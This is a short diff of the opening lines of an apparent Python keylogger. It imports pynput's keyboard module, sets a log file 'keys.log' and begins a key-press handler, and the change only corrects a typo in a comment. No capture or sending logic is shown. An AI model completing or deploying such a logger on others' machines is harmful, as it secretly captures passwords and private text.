@@ -1,7 +1,7 @@
 #Make sure you have pynput library
 from pynput import keyboard
 
-#File name so tave log
+#File name so save log
 LOG_FILE = "keys.log"
 
 def keyPressed(key):
